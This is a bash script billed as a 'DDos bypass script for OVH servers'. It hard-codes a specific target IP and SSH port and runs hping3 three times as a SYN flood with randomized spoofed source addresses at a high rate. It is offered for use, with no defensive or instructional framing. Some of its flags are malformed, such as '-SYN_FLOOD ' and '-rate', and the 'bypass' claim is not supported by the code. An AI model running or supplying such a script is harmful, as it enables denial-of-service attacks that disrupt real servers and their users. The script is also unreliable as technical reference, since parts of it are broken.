#!/bin/bash

# DDos bypass script for OVH servers

#  Change these variables as per your needs

IP_TARGET="66.70.205.227" # Target IP address or domain
ATTACK_TYPE="SYN_FLOOD " # Type of attack
ATTACK_PORT="22" # Port to attack
ATTACK_RATE="65500"  # Number of packets per second

# Other parameters
TIMEOUT="1" # Time out after which DDos stops

# The script

# Send beginning of attack with data
echo "[+] Sending Beginning of Attack..."
sleep $TIMEOUT
echo "[+] Sending data..."
sudo hping3 $IP_TARGET -$ATTACK_TYPE --flood -p $ATTACK_PORT -I eth0 -d 100 -S --rand-source -rate $ATTACK_RATE

# Send mid data of attack
echo "[+] Sending Mid of Attack..."
sleep $TIMEOUT
echo "[+] Sending data..."
sudo hping3 $IP_TARGET -$ATTACK_TYPE --flood -p $ATTACK_PORT -I eth0 -d 150 -S --rand-source -rate $ATTACK_RATE

# Send the end of the attack
echo "[+] Sending End of Attack..."
sleep $TIMEOUT
echo "[+] Sending data..."
sudo hping3 $IP_TARGET -$ATTACK_TYPE --flood -p $ATTACK_PORT -I eth0 -d 200 -S --rand-source -rate $ATTACK_RATE

echo "[+] Attack complete!"
